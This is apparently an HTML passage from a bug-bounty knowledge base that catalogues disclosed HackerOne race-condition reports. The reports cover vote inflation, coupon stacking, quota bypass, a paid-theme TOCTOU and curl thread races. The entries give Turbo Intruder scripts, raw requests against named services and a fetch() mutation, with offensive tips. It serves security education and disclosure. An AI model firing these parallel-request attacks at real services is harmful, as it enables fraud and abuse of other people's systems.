+<div class="spec-top"><h3>Vote-count race: parallel POST /votes lets one account upvote a report repeatedly</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#146845</b> · security · awarded · 124 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The upvote endpoint checks 'already voted' then increments without atomicity, so many concurrent POST /reports/&lt;id&gt;/votes from one session race the check and each bump the counter, inflating a report's rank.</p>
+<h4>Method</h4><ol><li>Capture the authenticated POST /reports/&lt;id&gt;/votes request (with CSRF token)</li><li>Replay it concurrently from many threads before the first vote commits</li><li>Counter increments multiple times for a single account (vote_count 48 -&gt; 49 -&gt; ...)</li></ol>
+<div class="pre">POST /reports/127158/votes HTTP/1.1  (X-CSRF-Token, session)  # fire N in parallel</div>
+<p class="insight"><b>Insight —</b> Any 'one action per user' counter (votes, likes, redemptions, follows) that does check-then-increment without a DB constraint or lock is racy. Fire the request with a burst / single-packet attack to beat the uniqueness check.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/146845" target="_blank" rel="noopener">hackerone.com/reports/146845</a></span><a class="src" href="#report-146845" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-927384" style="--sv:var(--sev-low)" data-sev="1" data-votes="112" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Counter inflation on single-allowed actions (follow/like/react) via parallel requests</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#927384</b> · stagingdoteverydotorg · none · 112 votes · resolved</div>
+<div class="taxo"><span>Program <b>stagingdoteverydotorg</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Idempotent user actions (follow, like, react, vote) are guarded by a check-then-insert ('already following?') with no atomic/unique constraint, so parallel requests each pass the check and the action is recorded multiple times.</p>
+<h4>Method</h4><ol><li>Capture the single 'Follow'/'Like'/'React' request.</li><li>Send it to Turbo Intruder and use the gate technique to release all final bytes together.</li><li>Multiple 201/200 responses = action counted multiple times from one account.</li></ol>
+<div class="pre">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, str(i), gate='race1')
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+# add a header 'Test: %s' to make each request unique for the wordlist</div>
+<p class="insight"><b>Insight —</b> Any endpoint that should be idempotent per user (follow, like, react, vote, upvote) is a counter-inflation target. Use Turbo Intruder gate='race1' to align the final bytes of many requests. Same primitive appears across many programs; impact ranges from cosmetic count inflation to notification flooding of a victim.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/927384" target="_blank" rel="noopener">hackerone.com/reports/927384</a></span><a class="src" href="#report-927384" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-454949" style="--sv:var(--sev-low)" data-sev="1" data-votes="93" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Flag/points submission race -&gt; points inflation escalating to program invites</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#454949</b> · security · awarded · 93 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Chain <b>points inflation -&gt; invitation thresholds -&gt; access to</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Flag submission awards points with a check-then-award ('flag not yet submitted by this user?') that is not atomic, so parallel submissions of the same flag award points repeatedly.</p>
+<h4>Method</h4><ol><li>Solve any challenge to get one valid flag (even a 1-point trivial one).</li><li>Capture the flag-submission POST and replay it many times in a short window with a fast parallel tool (Race The Web).</li><li>Points accumulate per successful parallel submission (submitted one flag 70x -&gt; earned 2 private-program invitations).</li></ol>
+<div class="pre"># Race The Web (https://github.com/insp3ctre/race-the-web) config replays the same
+# flag-submission POST in parallel; faster than Burp Intruder for this race.</div>
+<p class="insight"><b>Insight —</b> Gamification/points systems (CTF flags, reputation, karma) are high-value race targets because inflated points can escalate to REAL privilege - here, unlocking private-program invitations without solving challenges. Always ask what a points balance unlocks before rating a scoreboard race as cosmetic.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/454949" target="_blank" rel="noopener">hackerone.com/reports/454949</a></span><a class="src" href="#report-454949" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-953083" style="--sv:var(--sev-low)" data-sev="1" data-votes="90" data-bounty="2000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU race to publish a paid resource during install</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#953083</b> · shopify · USD 2000 · 90 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Chain <b>Install race -&gt; publish paid theme -&gt; edit/download so</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">During the paid-theme install flow there is a window where the theme exists but the purchase/ownership check hasn't finalized. Firing the ThemePublishLegacy GraphQL mutation against the freshly-created theme id in that window publishes (and effectively grants ownership of) the paid theme without paying.</p>
+<h4>Method</h4><ol><li>Pre-stage the ThemePublishLegacy fetch in DevTools console</li><li>Start installing a paid theme ('Try theme')</li><li>Race to the admin/themes tab, read the installing theme's gid from the ThemesProcessingLegacy response</li><li>Send the ThemePublishLegacy mutation with that gid before install completes</li><li>Theme publishes; badge/ownership restrictions are gone</li></ol>
+<div class="pre">fetch("/admin/api/unversioned/graphql",{method:"POST",credentials:"include",headers:{"content-type":"application/json"},body:JSON.stringify({operationName:"ThemePublishLegacy",variables:{id:"gid://shopify/OnlineStoreTheme/&lt;THEME_ID&gt;"},query:"mutation ThemePublishLegacy($id:ID!){onlineStoreThemePublish(id:$id){theme{id}userErrors{message}}}"})})</div>
+<p class="insight"><b>Insight —</b> Look for a gap between resource creation and entitlement enforcement in multi-step provisioning/checkout flows. Grab the new object id from an intermediate response and fire the privileged mutation in the TOCTOU window; automate to win the race reliably.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/953083" target="_blank" rel="noopener">hackerone.com/reports/953083</a></span><a class="src" href="#report-953083" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1037430" style="--sv:var(--sev-low)" data-sev="1" data-votes="56" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race condition on one-time promo redemption</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1037430</b> · bumble · awarded · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>bumble</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'accept free premium' action checked eligibility and granted the reward non-atomically; firing many parallel requests before state updates redeemed the single offer multiple times, stacking premium days.</p>
+<h4>Method</h4><ol><li>Trigger the delete-account retention offer to reach 'Get free Badoo Premium'</li><li>Capture the SERVER_PROMO_ACCEPTED request</li><li>Send it in parallel with Turbo Intruder race.py (single-packet)</li><li>Multiple 200s =&gt; multiple 3-day grants stacked</li></ol>
+<div class="pre">POST /webapi.phtml?SERVER_PROMO_ACCEPTED HTTP/1.1
+Host: eu1.badoo.com
+X-Message-type: 402
+Content-Type: json
+
+{"body":[{"message_type":402,"p_string":{"value":"delete_account_trial_spp_new_flow"}}],"message_id":101,"message_type":402,"version":1}
+# fire N copies concurrently via turbo-intruder race.py</div>
+<p class="insight"><b>Insight —</b> Any 'claim once' benefit (coupon, trial, referral, cashout) is a race target. Use Turbo Intruder race.py / Burp single-packet attack to send concurrent redemptions before the eligibility flag is written.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1037430" target="_blank" rel="noopener">hackerone.com/reports/1037430</a></span><a class="src" href="#report-1037430" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1717650" style="--sv:var(--sev-low)" data-sev="1" data-votes="54" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Coupon/promo redemption-limit TOCTOU (winnable with two browser tabs)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1717650</b> · stripe · awarded · 54 votes · resolved</div>
+<div class="taxo"><span>Program <b>stripe</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Promotion-code redemption count is checked then decremented non-atomically at checkout, so two near-simultaneous checkouts both read remaining&gt;0 and both succeed, exceeding the redemption limit.</p>
+<h4>Method</h4><ol><li>As merchant, create a promo code with redemption limit 1.</li><li>As buyer, open two payment links for the same merchant and apply the same coupon on both, but do not pay yet.</li><li>Click Pay/Subscribe on both as fast as possible; both succeed using the single-use coupon twice.</li></ol>
+<div class="pre"># no request payload needed - open two checkout tabs with the same promo code applied,
+# then submit both Pay buttons simultaneously (scale later with Burp/turbo intruder).</div>
+<p class="insight"><b>Insight —</b> Redemption/gift-card/voucher/quota counters guarded by check-then-decrement are the textbook TOCTOU. Before assuming you need tooling, try the manual two-tab click - many of these races are wide enough to win by hand.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1717650" target="_blank" rel="noopener">hackerone.com/reports/1717650</a></span><a class="src" href="#report-1717650" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-488985" style="--sv:var(--sev-low)" data-sev="1" data-votes="53" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL claim-mutation race -&gt; grab scarce resource multiple times / deny others</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#488985</b> · security · awarded · 53 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The claimCredential GraphQL mutation checks 'already claimed?' then assigns a credential from a limited pool non-atomically; parallel mutations each pass the check and assign multiple credential sets, potentially exhausting the pool and blocking legitimate users.</p>
+<h4>Method</h4><ol><li>Capture the single claimCredential mutation for a program that provides test credentials.</li><li>Send it to Burp Intruder / turbo intruder and fire many copies in parallel.</li><li>Multiple distinct credential sets are returned (21/22 returned one set, the last returned a different set), i.e. more than the one intended claim.</li></ol>
+<div class="pre">POST /graphql HTTP/1.1
+Host: hackerone.com
+X-Auth-Token: &lt;token&gt;
+Content-Type: application/json
+
+{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!...){claimCredential(input:$input_0){...}}","variables":{"input_0":{"team_id":"&lt;id&gt;","clientMutationId":"1"}}}
+# fire in parallel via Intruder</div>
+<p class="insight"><b>Insight —</b> GraphQL mutations that provision/claim a scarce or single-allotment resource (test credentials, seats, licenses, one-time grants) are prime race targets. Racing can grab more than your allotment or deny others via resource exhaustion. Fuzz every 'claim/allocate/reserve' mutation with parallel copies.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/488985" target="_blank" rel="noopener">hackerone.com/reports/488985</a></span><a class="src" href="#report-488985" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1913309" style="--sv:var(--sev-low)" data-sev="1" data-votes="49" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bypass 'max N per account' quota via parallel resource creation</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1913309</b> · mozilla · none · 49 votes · resolved</div>
+<div class="taxo"><span>Program <b>mozilla</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A hard per-account limit (max 5 monitored emails) is enforced by counting existing rows then inserting; parallel create requests all read count&lt;limit before any insert commits, so all succeed and the limit is exceeded.</p>
+<h4>Method</h4><ol><li>Reach the enforced limit (e.g. 5 emails) so the next add is normally rejected.</li><li>Capture the create request and fire many copies in parallel (Intruder / turbo intruder).</li><li>Account ends with more than the allowed maximum of resources.</li></ol>
+<div class="pre">POST /api/v1/user/email HTTP/2
+Host: &lt;target&gt;
+Content-Type: application/json
+X-Csrf-Token: &lt;token&gt;
+Cookie: &lt;session&gt;
+
+{"email":"attacker+N@example.com"}
+# fire in parallel via Intruder while already at the limit</div>
+<p class="insight"><b>Insight —</b> Any 'maximum N per account' cap (emails, team seats, subdomains, API keys, verifications, invites) enforced with count-then-insert is bypassable by parallel creation. The correct fix is a DB-level constraint / atomic counter making the store the source of truth (exactly the fix WorldID applied). When you see a soft limit, always try to race past it.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1913309" target="_blank" rel="noopener">hackerone.com/reports/1913309</a></span><a class="src" href="#report-1913309" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-183837" style="--sv:var(--sev-low)" data-sev="1" data-votes="42" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Vote/counter inflation via parallel-request race on one-per-user check</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#183837</b> · urbandictionary · none · 42 votes · resolved</div>
+<div class="taxo"><span>Program <b>urbandictionary</b></span><span>Surface <b>api</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The up/down-vote endpoint enforced one vote per user with a non-atomic check-then-write. Sending many parallel vote requests let them all pass the 'already voted?' check before any committed, so a single user inflated the counter repeatedly.</p>
+<h4>Method</h4><ol><li>Capture the vote request (with the user/session key)</li><li>Send it from many parallel threads simultaneously (Intruder/Turbo Intruder, ~10-20 threads)</li><li>Observe multiple 'saved' responses with the tally climbing each time</li></ol>
+<div class="pre">GET /v0/vote?defid=3889203&amp;direction=up&amp;key=&lt;sessionkey&gt; HTTP/1.1
+Host: api.TARGET
+# fire 10-20 in parallel -&gt; {"status":"saved","up":6429}, 6430, 6431 ...</div>
+<p class="insight"><b>Insight —</b> Reputation/counter endpoints (votes, likes, follows, poll options, review scores) with a one-per-user rule are classic race targets: parallelize the same request and watch whether the uniqueness guard holds under concurrency. Same TOCTOU family as coupon/limit races.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/183837" target="_blank" rel="noopener">hackerone.com/reports/183837</a></span><a class="src" href="#report-183837" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-413759" style="--sv:var(--sev-low)" data-sev="1" data-votes="36" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race condition bypasses plan resource limit (TOCTOU)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#413759</b> · shopify · USD 500 · 36 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The create-location limit check and the insert are not atomic; firing many create requests concurrently passes the check before any commit, creating more locations than the plan allows (12 vs 4).</p>
+<h4>Method</h4><ol><li>Capture the create-location request</li><li>Send N copies simultaneously (Burp Turbo Intruder / single-packet attack)</li><li>All pass the pre-check and commit -&gt; limit exceeded</li></ol>
+<div class="pre">Send the create-location POST xN in parallel (single-packet / last-byte-sync)</div>
+<p class="insight"><b>Insight —</b> Any 'you may have at most N of X' quota is a TOCTOU target: blast parallel creates to slip past the count check before commit. Compare with the logic-based variant (#3102890, pending invites). Note: programs may consider bare plan-limit races low value unless there is further impact.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/413759" target="_blank" rel="noopener">hackerone.com/reports/413759</a></span><a class="src" href="#report-413759" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1285538" style="--sv:var(--sev-low)" data-sev="1" data-votes="26" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Single-gate race to bypass a uniqueness constraint (duplicate memberships)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1285538</b> · omise · awarded · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>omise</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'already invited?' check and the insert are not atomic (no lock/unique constraint), so many concurrent identical invite requests all pass the check before any writes, creating duplicate memberships.</p>
+<h4>Method</h4><ol><li>Capture the POST /team/memberships invite request</li><li>In Turbo Intruder, tag it with a gate and queue ~30 copies, then openGate to release the final byte of all simultaneously</li><li>Multiple 200 OKs return; the member is invited many times</li><li>Duplicates persist even after the invite is accepted</li></ol>
+<div class="pre">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30,
+                           requestsPerConnection=100, pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, target.baseInput, gate='race1')
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)</div>
+<p class="insight"><b>Insight —</b> Any 'check-then-act' with a uniqueness/limit rule is a race candidate. Fire N identical requests through a single release gate (Turbo Intruder gate= / Burp single-packet) so they all clear the check before the first commit.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1285538" target="_blank" rel="noopener">hackerone.com/reports/1285538</a></span><a class="src" href="#report-1285538" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2954286" style="--sv:var(--sev-low)" data-sev="1" data-votes="24" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Double-close of a file descriptor -&gt; fd-number reuse hijack in threaded code</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2954286</b> · curl · none · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>curl</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An eventfd is close()d twice in multithreaded libcurl. Between the two closes another thread's open()/accept() is assigned the just-freed fd number; the second close then closes that unrelated descriptor, and subsequent I/O intended for the fd targets the wrong (possibly attacker) resource.</p>
+<h4>Method</h4><ol><li>Thread A (curl) reaches the first close(X).</li><li>Thread B opens a sensitive file OR thread C accepts an attacker connection and is assigned fd X (numbers are recycled immediately).</li><li>Thread A reaches the second close(X), closing B/C's descriptor; later writes/reads then go to the attacker-controlled fd -&gt; data leak or injection.</li></ol>
+<div class="pre">// conceptual interleaving (no single payload):
+// T_curl: close(X); ... ; close(X)   // double close
+// T_open/accept: fd = open(secret)|accept(sock);  // gets recycled X in between
+// -&gt; writes meant for the secret file land on the attacker's fd, or vice versa</div>
+<p class="insight"><b>Insight —</b> A double-close (or use-after-close) is a security bug, not just a hygiene issue, in any multithreaded program: freed fd numbers are recycled instantly, so a racing open()/accept()/socket() can occupy the reused number and get hijacked. When auditing threaded C, treat double-close/UAF-on-fd like a UAF - hunt for close() paths reachable twice without nulling the fd.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2954286" target="_blank" rel="noopener">hackerone.com/reports/2954286</a></span><a class="src" href="#report-2954286" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-214028" style="--sv:var(--sev-low)" data-sev="1" data-votes="22" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU file swap via colliding upload filenames + async processing</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#214028</b> · gitlab · none · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Uploaded import files are written to a shared path derived from the original filename, then processed later by an async worker; two uploads with the same filename in the window between copy and processing cause one user's job to unpack another user's file.</p>
+<h4>Method</h4><ol><li>Upload an import archive with a predictable/common filename (e.g. import.tar.gz)</li><li>A victim uploads a file with the same name before the queue drains</li><li>The shared path is overwritten; the async job restores the other user's contents into your project</li></ol>
+<div class="pre"># vulnerable path derivation
+import_upload_path = File.join(storage_path, 'uploads', params[:file].original_filename)
+# reproduce: stop Sidekiq, upload same-named file from two accounts, restart</div>
+<p class="insight"><b>Insight —</b> When file writes use user-controlled names in a shared directory and processing is deferred (queue/cron), you have a TOCTOU swap primitive. Force collisions with common names; fix is random server-side filenames namespaced per user.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/214028" target="_blank" rel="noopener">hackerone.com/reports/214028</a></span><a class="src" href="#report-214028" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1087188" style="--sv:var(--sev-low)" data-sev="1" data-votes="20" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race the trial-provisioning endpoint for multiplied free quota</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1087188</b> · weblate · none · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">POST /trial/ enforces a rate limit but not atomic 'one trial per account' logic, so concurrent requests each create a trial, multiplying strings/languages quota.</p>
+<h4>Method</h4><ol><li>Intercept the Start-Trial POST /trial/ request</li><li>Send it to Turbo Intruder with a race config (single-packet / gate)</li><li>Multiple trials are provisioned in parallel (e.g. 6x -&gt; 6x50k strings, &gt;100 languages)</li></ol>
+<div class="pre"># Turbo Intruder race.py, tag requests with 'Test: %s' header, openGate to fire simultaneously
+POST /trial/ HTTP/1.1
+Host: hosted.weblate.org
+csrfmiddlewaretoken=...</div>
+<p class="insight"><b>Insight —</b> 'One-per-account' business limits (trials, coupons, votes, withdrawals) are usually enforced as check-then-insert without a DB unique constraint/lock. Fire N concurrent requests in one window to bypass the singleton guard.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1087188" target="_blank" rel="noopener">hackerone.com/reports/1087188</a></span><a class="src" href="#report-1087188" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1990421" style="--sv:var(--sev-low)" data-sev="1" data-votes="7" data-bounty="480">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unsynchronized global buffer + siglongjmp timeout -&gt; multithread crash (DoS)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1990421</b> · ibb · 480 · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">libcurl's synchronous name resolver used alarm()/siglongjmp() to time out slow resolves and stored results in a global buffer with no mutex; concurrent threads racing that shared state corrupt it, crashing or misbehaving.</p>
+<h4>Method</h4><ol><li>Build libcurl with the synchronous (non-threaded, non-c-ares) resolver.</li><li>Drive many concurrent resolves from multiple threads so the alarm/siglongjmp timeout path and the shared global buffer are exercised in parallel.</li><li>The unprotected global state is corrupted -&gt; crash / undefined behavior.</li></ol>
+<div class="pre"># no single payload - trigger many concurrent DNS resolves in a multithreaded
+# process using the sync resolver so the shared global buffer races.</div>
+<p class="insight"><b>Insight —</b> Shared static/global buffers touched by signal handlers (siglongjmp) or by multiple threads without locking are memory-safety races. In multithreaded libraries, audit 'sync'/legacy code paths for global/static state and signal-based control flow; siglongjmp out of a signal handler across threads is especially fragile.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1990421" target="_blank" rel="noopener">hackerone.com/reports/1990421</a></span><a class="src" href="#report-1990421" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1929597" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Thread race on a global sigjmp_buf in alarm-based DNS timeout (curl siglongjmp)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1929597</b> · curl · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>curl</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">On builds without POSIX/Windows threading, libcurl's USE_ALARM_TIMEOUT path uses a single global sigjmp_buf (curl_jmpenv) for DNS-resolution timeouts. Two threads resolving concurrently can siglongjmp with a wrong register context when a DNS timeout fires, causing SIGSEGV.</p>
+<h4>Method</h4><ol><li>Force the USE_ALARM_TIMEOUT path (systems lacking threaded resolver, or #define it for testing)</li><li>Run the multithreaded example with CURLOPT_TIMEOUT set low</li><li>Point DNS at a blackhole resolver so timeouts fire in multiple threads simultaneously</li><li>siglongjmp restores a stale jmp_buf → crash in Curl_resolv_timeout/Curl_failf</li></ol>
+<div class="pre"># Trigger path for local repro:
+#define USE_ALARM_TIMEOUT   /* in lib/hostip.c */
+// then in the multithread sample: curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2);
+// DNS -&gt; blackhole (e.g. 3.219.212.117) so alarm()/siglongjmp fires in 2+ threads
+// Fix: guard the sigsetjmp/siglongjmp region with a curl_simple_lock</div>
+<p class="insight"><b>Insight —</b> A remote party controlling DNS response timing (privileged network position) can drive DoS in apps linking a non-thread-safe libcurl. General lesson: any process-global buffer used by signal handlers (sigjmp_buf, static state) is a race hazard the moment two threads can enter the guarded region — audit for shared non-reentrant state on timeout/signal paths.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1929597" target="_blank" rel="noopener">hackerone.com/reports/1929597</a></span><a class="src" href="#report-1929597" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2917368" style="--sv:var(--sev-low)" data-sev="1" data-votes="22" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU race to hijack active ICA channel during IBC upgrade</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2917368</b> · cosmos · awarded · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>cosmos</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'active channel' for an interchain account is set via a check-then-act sequence that is not atomic across the controller (ack) and host (open-confirm) handshakes, and the existence check misses FLUSH states. An attacker races a malicious channel into the window.</p>
+<h4>Method</h4><ol><li>Monitor newly-initiated ICA channels on the source chain</li><li>During the window between ICA chan-init on controller and open-confirm on host, chan-init + chan-try a second channel on the same ICA port/connection with a different (old) encoding</li><li>Wait for the victim channel to begin an upgrade (encoding change proposal)</li><li>Complete the malicious channel handshake in parallel so it becomes the active channel with a stale encoding</li><li>Host can no longer deserialize ICA txs until another upgrade is performed</li></ol>
+<p class="insight"><b>Insight —</b> State-machine handshakes / two-phase commits are prime TOCTOU targets: if the 'is there already an active X?' check and the 'set X active' write are not one atomic transaction, and the check omits transitional states (flushing/upgrading), you can slip a second entity in during a state transition.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2917368" target="_blank" rel="noopener">hackerone.com/reports/2917368</a></span><a class="src" href="#report-2917368" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-157996" style="--sv:var(--sev-none)" data-sev="0" data-votes="43" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Coupon/promo redemption race enables stacking a single code</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#157996</b> · instacart · awarded · 43 votes · resolved</div>
+<div class="taxo"><span>Program <b>instacart</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The promo-redemption endpoint checked 'already redeemed?' and then applied credit non-atomically (TOCTOU). Firing many redemption requests in parallel let all pass the check before any committed, stacking the same coupon's value repeatedly.</p>
+<h4>Method</h4><ol><li>Capture the redeem-promo-code request</li><li>Replay it many times concurrently/asynchronously (Turbo Intruder / single-packet)</li><li>Observe the same code applied multiple times, stacking discount/credit</li></ol>
+<div class="pre">POST /redeem  (code=PROMO)   x N in parallel (race window)</div>
